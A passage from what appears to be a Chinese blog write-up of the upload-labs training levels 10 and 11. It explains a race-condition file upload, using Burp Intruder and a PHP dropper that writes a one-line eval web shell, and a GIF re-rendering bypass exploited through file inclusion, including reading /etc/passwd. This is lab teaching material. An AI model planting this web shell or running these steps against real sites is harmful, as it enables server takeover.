+<p>连接成功</p>
+<h2 id="upload-10-条件竞争">upload-10 [条件竞争]</h2>
+<p><img src="D:%5cmyblog%5chugoblog%5ccontent%5cpost%5c2024%5cupload-labs%e9%9d%b6%e5%9c%ba.assets%5cimage-20240416214311775.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240416214311775"
+	
+	
+></p>
+<h3 id="漏洞分析-8">漏洞分析</h3>
+<p>​	直接看代码，可以看到文件先会被成功上传，然后才会根据白名单，进行修改文件名或者删除文件，所以如果我们能在程序在改变文件之前访问文件，就能成功执行该木马文件。但因为它只能存在一会儿，所以木马的内容需要修改</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;xiao.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>这段代码意思就是在当前目录下创建一个名为<code>xiao.php</code>的一句话木马，只要我们执行了文件，就能成功写入一句话木马。</p>
+<h3 id="解决方法-7">解决方法</h3>
+<p>上传文件，然后用bp抓包</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162151382.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240416215136258"
+	
+	
+></p>
+<p>右键选择intruder，选择<code>Null payloads</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162152446.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240416215230400"
+	
+	
+></p>
+<p>然后我们访问它即将上传的网站路径，再次抓包，然后如上的操作，之后点击<code>开始攻击</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162155784.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240416215554681"
+	
+	
+></p>
+<p>右边爆破的长度出现变化，说明执行成功了，接下来就可以访问到<code>xiao.php</code>文件，用蚁剑成功连接</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162204179.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240416220400098"
+	
+	
+></p>
+<h2 id="upload-11-二次渲染">upload-11 [二次渲染]</h2>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171255256.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240417125525098"
+	
+	
+></p>
+<h3 id="漏洞分析-9">漏洞分析</h3>
+<p>这里的关键就在于<code>imagecreatefromxxx</code>这个函数，它会把我们上传的图片文件进行一次渲染，导致的结果就是图片中的二进制数据可能会发生改变，也就是我们上传的图片码会被渲染成一张普通图片，里面用于执行的代码可能会被修改删除。但是我们依然有绕过的办法，就如该页面所给出的提示。</p>
+<h4 id="gif">gif</h4>
+<p>准备一张gif图</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171301431.gif"
+	
+	
+	
+	loading="lazy"
+	
+		alt="16036176592096"
+	
+	
+></p>
+<p>我们把它上传上去，然后将渲染后的图片保存到本地，接着将两张图片放入<code>010editor</code>进行比较</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171308824.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240417130859733"
+	
+	
+></p>
+<p>灰色的部分就是没有发生变化的部分，所以我们可以把代码写入灰色部分。</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171311294.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240417131112261"
+	
+	
+></p>
+<p>然后再次将它上传，将渲染后的gif图保存到本地</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171312924.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240417131251883"
+	
+	
+></p>
+<p>可以看到payload没有被删除，个人感觉gif是最简单的。</p>
+<h4 id="jpg">jpg</h4>
+<h4 id="png">png</h4>
+<p>这两个都需要脚本进行修改，人比较懒后面再进行补充</p>
+<h3 id="解决方法-8">解决方法</h3>
+<p>上面的方法是我们如何将payload成功填入文件，并上传，但上传后该怎么使用呢。其实可以注意到这关的网址和之前是有一点区别的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://ip:30011/?file=hint.html
+</span></span></code></pre></div><p>多了一个<code>file</code>参数，在没有看源码时能想到，这里可能存在文件包含漏洞，我们传入<code>/etc/passwd</code></p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171321855.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240417132135781"
+	
+	
+></p>
+<p>确实存在文件包含漏洞，所以我们只要包含上传图片的路径，就能执行里面的payload了，然后用蚁剑连接</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171329587.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240417132943523"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["/source/Sticker-100/"],"locale":{"admin":"👻屑博主","placeholder":"🎉留下你的脚印."},"requiredMeta":["name","email","url"]});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 Winglet
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
